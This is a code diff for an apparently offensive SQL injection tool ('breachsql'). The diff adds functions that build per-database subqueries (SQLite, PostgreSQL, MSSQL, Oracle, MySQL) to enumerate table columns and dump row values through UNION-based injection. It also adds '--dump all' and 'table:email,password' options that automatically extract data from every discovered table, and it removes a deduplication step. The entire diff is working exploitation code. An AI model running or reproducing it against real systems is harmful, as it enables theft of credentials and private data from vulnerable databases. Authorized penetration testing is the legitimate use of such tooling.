@@ -9,7 +9,7 @@ from __future__ import annotations
 
 import re
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from typing import Any, Dict, List
+from typing import Any, Dict, List, Tuple
 
 from ..log import get_logger
 from .. import crawler as crawler_mod
@@ -26,6 +26,76 @@ from commonhuman_payloads.sqli import get_extraction_targets
 from ..reporter import ExtractionFinding
 
 logger = get_logger("breachsql.pipeline")
+
+
+def _csv_items(raw: str) -> List[str]:
+    return [p.strip() for p in (raw or "").split(",") if p.strip()]
+
+
+def _column_list_expr(dbms: str, table: str) -> str:
+    if dbms in ("sqlite",):
+        return f"(SELECT GROUP_CONCAT(name, ',') FROM pragma_table_info('{table}'))"
+    if dbms in ("postgres", "postgresql"):
+        return (
+            "(SELECT string_agg(column_name, ',') "
+            "FROM information_schema.columns "
+            f"WHERE table_name='{table}')"
+        )
+    if dbms in ("mssql",):
+        return (
+            "(SELECT STRING_AGG(CAST(column_name AS NVARCHAR(MAX)),',') "
+            "FROM INFORMATION_SCHEMA.COLUMNS "
+            f"WHERE TABLE_NAME='{table}')"
+        )
+    if dbms in ("oracle",):
+        return (
+            "(SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_id) "
+            "FROM all_tab_columns "
+            f"WHERE table_name=UPPER('{table}'))"
+        )
+    return (
+        "(SELECT GROUP_CONCAT(column_name SEPARATOR ',') "
+        "FROM information_schema.columns "
+        f"WHERE table_name='{table}')"
+    )
+
+
+def _table_dump_expr(dbms: str, table: str, cols: List[str]) -> str:
+    if dbms in ("sqlite",):
+        row_expr = " || ',' || ".join([f"COALESCE(CAST(\"{c}\" AS TEXT), 'NULL')" for c in cols])
+        return (
+            f"(SELECT GROUP_CONCAT({row_expr}, '|') "
+            f"FROM (SELECT {', '.join([f'\"{c}\"' for c in cols])} "
+            f"FROM \"{table}\" LIMIT 50) t)"
+        )
+    if dbms in ("postgres", "postgresql"):
+        row_expr = " || ',' || ".join([f"COALESCE(CAST(\"{c}\" AS TEXT), 'NULL')" for c in cols])
+        return (
+            f"(SELECT string_agg({row_expr}, '|') "
+            f"FROM (SELECT {', '.join([f'\"{c}\"' for c in cols])} "
+            f"FROM \"{table}\" LIMIT 50) t)"
+        )
+    if dbms in ("mssql",):
+        row_expr = " + ',' + ".join([f"COALESCE(CAST([{c}] AS NVARCHAR(MAX)), 'NULL')" for c in cols])
+        return (
+            f"(SELECT STRING_AGG({row_expr}, '|') "
+            f"FROM (SELECT TOP 50 {', '.join([f'[{c}]' for c in cols])} "
+            f"FROM [{table}]) t)"
+        )
+    if dbms in ("oracle",):
+        # Oracle fallback: concatenate discovered columns row-wise using || and LISTAGG.
+        row_expr = " || ',' || ".join([f"NVL(TO_CHAR(\"{c}\"), 'NULL')" for c in cols])
+        return (
+            f"(SELECT LISTAGG({row_expr}, '|') WITHIN GROUP (ORDER BY 1) "
+            f"FROM (SELECT {', '.join([f'\"{c}\"' for c in cols])} "
+            f"FROM \"{table}\" WHERE ROWNUM <= 50) t)"
+        )
+    row_expr = ", ".join([f"COALESCE(CAST(`{c}` AS CHAR), 'NULL')" for c in cols])
+    return (
+        f"(SELECT GROUP_CONCAT(CONCAT_WS(',', {row_expr}) SEPARATOR '|') "
+        f"FROM (SELECT {', '.join([f'`{c}`' for c in cols])} "
+        f"FROM `{table}` LIMIT 50) t)"
+    )
 
 
 def run(url: str, opts: ScanOptions, injector: Injector, result: ScanResult) -> None:
@@ -179,16 +249,6 @@ def run(url: str, opts: ScanOptions, injector: Injector, result: ScanResult) -> 
     else:
         pass  # crawler not enabled; surfaces already built from URL params and POST data
 
-    # Deduplicate: the BFS crawler re-visits the seed URL, re-adding its params.
-    _seen_surfaces: set = set()
-    _deduped: list = []
-    for _s in surfaces:
-        _key = (_s["url"], _s["method"], _s["single_param"])
-        if _key not in _seen_surfaces:
-            _seen_surfaces.add(_key)
-            _deduped.append(_s)
-    surfaces = _deduped
-
     if surfaces:
         logger.info("%d injectable surface(s) identified", len(surfaces))
     else:
@@ -268,18 +328,110 @@ def _run_exploit(
     dbms = (result.dbms_detected or opts.dbms or "auto").lower()
     targets = get_extraction_targets(dbms)
 
-    if opts.dump:
-        _tbl = opts.dump
-        if dbms in ("sqlite", "postgres", "postgresql"):
-            dump_expr = f"(SELECT GROUP_CONCAT(c, '|') FROM (SELECT * FROM \"{_tbl}\" LIMIT 50) t)"
-        elif dbms in ("mssql",):
-            dump_expr = f"(SELECT STRING_AGG(CAST(c AS NVARCHAR(MAX)),'|') FROM (SELECT * FROM [{_tbl}]) t)"
-        else:
-            dump_expr = (
-                f"(SELECT GROUP_CONCAT(CAST(c AS CHAR) SEPARATOR '|')"
-                f" FROM (SELECT CONCAT_WS(',', *) AS c FROM `{_tbl}` LIMIT 50) t)"
+    if opts.dump_columns:
+        _tbl = opts.dump_columns
+        if dbms in ("sqlite",):
+            cols_expr = (
+                f"(SELECT GROUP_CONCAT(name, ',') FROM pragma_table_info('{_tbl}'))"
             )
-        targets = targets + [(f"dump:{_tbl}", dump_expr)]
+        elif dbms in ("postgres", "postgresql"):
+            cols_expr = (
+                "(SELECT string_agg(column_name, ',') "
+                "FROM information_schema.columns "
+                f"WHERE table_name='{_tbl}')"
+            )
+        elif dbms in ("mssql",):
+            cols_expr = (
+                "(SELECT STRING_AGG(CAST(column_name AS NVARCHAR(MAX)),',') "
+                "FROM INFORMATION_SCHEMA.COLUMNS "
+                f"WHERE TABLE_NAME='{_tbl}')"
+            )
+        elif dbms in ("oracle",):
+            cols_expr = (
+                "(SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_id) "
+                "FROM all_tab_columns "
+                f"WHERE table_name=UPPER('{_tbl}'))"
+            )
+        else:
+            cols_expr = (
+                "(SELECT GROUP_CONCAT(column_name SEPARATOR ',') "
+                "FROM information_schema.columns "
+                f"WHERE table_name='{_tbl}')"
+            )
+        targets = targets + [(f"columns:{_tbl}", cols_expr)]
+
+    if opts.dump:
+        # Supports:
+        #   --dump users
+        #   --dump users:email,password
+        #   --dump all
+        # Prefer explicit columns for reliable value extraction.
+        _dump_raw = opts.dump.strip()
+        _tbl = _dump_raw
+        _cols: List[str] = []
+        _dump_all = _dump_raw.lower() in ("all", "*")
+        if ":" in _dump_raw:
+            _tbl, _colspec = _dump_raw.split(":", 1)
+            _tbl = _tbl.strip()
+            _cols = [c.strip() for c in _colspec.split(",") if c.strip()]
+
+        if _cols:
+            if dbms in ("sqlite",):
+                _row_expr = " || ',' || ".join(
+                    [f"COALESCE(CAST(\"{c}\" AS TEXT), 'NULL')" for c in _cols]
+                )
+                dump_expr = (
+                    f"(SELECT GROUP_CONCAT({_row_expr}, '|') "
+                    f"FROM (SELECT {', '.join([f'\"{c}\"' for c in _cols])} "
+                    f"FROM \"{_tbl}\" LIMIT 50) t)"
+                )
+            elif dbms in ("postgres", "postgresql"):
+                _row_expr = " || ',' || ".join(
+                    [f"COALESCE(CAST(\"{c}\" AS TEXT), 'NULL')" for c in _cols]
+                )
+                dump_expr = (
+                    f"(SELECT string_agg({_row_expr}, '|') "
+                    f"FROM (SELECT {', '.join([f'\"{c}\"' for c in _cols])} "
+                    f"FROM \"{_tbl}\" LIMIT 50) t)"
+                )
+            elif dbms in ("mssql",):
+                _row_expr = " + ',' + ".join(
+                    [f"COALESCE(CAST([{c}] AS NVARCHAR(MAX)), 'NULL')" for c in _cols]
+                )
+                dump_expr = (
+                    f"(SELECT STRING_AGG({_row_expr}, '|') "
+                    f"FROM (SELECT TOP 50 {', '.join([f'[{c}]' for c in _cols])} "
+                    f"FROM [{_tbl}]) t)"
+                )
+            else:
+                _row_expr = ", ".join(
+                    [f"COALESCE(CAST(`{c}` AS CHAR), 'NULL')" for c in _cols]
+                )
+                dump_expr = (
+                    f"(SELECT GROUP_CONCAT(CONCAT_WS(',', {_row_expr}) SEPARATOR '|') "
+                    f"FROM (SELECT {', '.join([f'`{c}`' for c in _cols])} "
+                    f"FROM `{_tbl}` LIMIT 50) t)"
+                )
+        elif not _dump_all:
+            # Backward-compatible fallback when no columns are provided.
+            if dbms in ("postgres", "postgresql"):
+                dump_expr = (
+                    f"(SELECT string_agg(row_to_json(t)::text, '|') "
+                    f"FROM (SELECT * FROM \"{_tbl}\" LIMIT 50) t)"
+                )
+            elif dbms in ("mssql",):
+                dump_expr = (
+                    f"(SELECT STRING_AGG(CAST((SELECT t.* FOR JSON PATH, WITHOUT_ARRAY_WRAPPER) "
+                    f"AS NVARCHAR(MAX)),'|') FROM (SELECT TOP 50 * FROM [{_tbl}]) t)"
+                )
+            else:
+                # For sqlite/mysql, reliable full-row dumping needs explicit columns.
+                # Keep a minimal fallback so the feature still returns something.
+                dump_expr = f"(SELECT COUNT(*) FROM \"{_tbl}\")" if dbms in ("sqlite",) else f"(SELECT COUNT(*) FROM `{_tbl}`)"
+
+        if not _dump_all:
+            label_suffix = f"{_tbl}:{','.join(_cols)}" if _cols else _tbl
+            targets = targets + [(f"dump:{label_suffix}", dump_expr)]
 
     # Prefer UNION extraction (one request per target, no binary search)
     if result.union_based:
@@ -294,6 +446,7 @@ def _run_exploit(
         if surface is not None:
             logger.info("Extracting %d target(s) via UNION on %s [%s]",
                         len(targets), union_finding.parameter, union_finding.url)
+            extracted_map: Dict[str, str] = {}
             for label, expr in targets:
                 try:
                     value = extract_via_union(
@@ -306,6 +459,7 @@ def _run_exploit(
                     )
                     if value:
                         logger.info("[EXTRACTED] %s = %s", label, value)
+                        extracted_map[label] = value
                         result.extracted.append(ExtractionFinding(
                             url=union_finding.url,
                             parameter=union_finding.parameter,
@@ -318,6 +472,82 @@ def _run_exploit(
                         logger.debug("extract: no value returned for %s", label)
                 except Exception as exc:
                     result.append_error(f"Extraction failed ({label}): {exc}")
+
+            # Auto dump actual row values by auto-enumerating table columns.
+            # Behaviors:
+            # - --dump users              -> dump all discovered columns from users
+            # - --dump users:email,pass   -> dump selected columns
+            # - --dump all                -> dump all columns for each discovered table
+            if opts.dump or opts.exploit:
+                _dump_raw = opts.dump.strip() if opts.dump.strip() else "all"
+                _dump_all = _dump_raw.lower() in ("all", "*")
+                _tables: List[str] = []
+                if _dump_all:
+                    _tables = _csv_items(extracted_map.get("tables", ""))
+                else:
+                    _tbl = _dump_raw.split(":", 1)[0].strip()
+                    if _tbl:
+                        _tables = [_tbl]
+
+                for _tbl in _tables:
+                    _given_cols: List[str] = []
+                    if (not _dump_all) and (":" in _dump_raw):
+                        _given_cols = _csv_items(_dump_raw.split(":", 1)[1])
+
+                    _cols = _given_cols
+                    if not _cols:
+                        cols_expr = _column_list_expr(dbms, _tbl)
+                        try:
+                            cols_value = extract_via_union(
+                                expr=cols_expr,
+                                union_finding=union_finding,
+                                surface=surface,
+                                evasions=evasions,
+                                opts=opts,
+                                injector=injector,
+                            )
+                        except Exception as exc:
+                            result.append_error(f"Column extraction failed ({_tbl}): {exc}")
+                            continue
+
+                        if cols_value:
+                            _cols = _csv_items(cols_value)
+                            result.extracted.append(ExtractionFinding(
+                                url=union_finding.url,
+                                parameter=union_finding.parameter,
+                                method=union_finding.method,
+                                expr=cols_expr,
+                                value=cols_value,
+                                mode="union",
+                            ))
+
+                    if not _cols:
+                        continue
+
+                    dump_expr = _table_dump_expr(dbms, _tbl, _cols)
+                    try:
+                        dump_value = extract_via_union(
+                            expr=dump_expr,
+                            union_finding=union_finding,
+                            surface=surface,
+                            evasions=evasions,
+                            opts=opts,
+                            injector=injector,
+                        )
+                    except Exception as exc:
+                        result.append_error(f"Dump extraction failed ({_tbl}): {exc}")
+                        continue
+
+                    if dump_value:
+                        result.extracted.append(ExtractionFinding(
+                            url=union_finding.url,
+                            parameter=union_finding.parameter,
+                            method=union_finding.method,
+                            expr=dump_expr,
+                            value=dump_value,
+                            mode="union",
+                        ))
+                        logger.info("[EXTRACTED] dump:%s = %s", _tbl, dump_value)
             return
 
     # Fall back to boolean / time-blind extraction
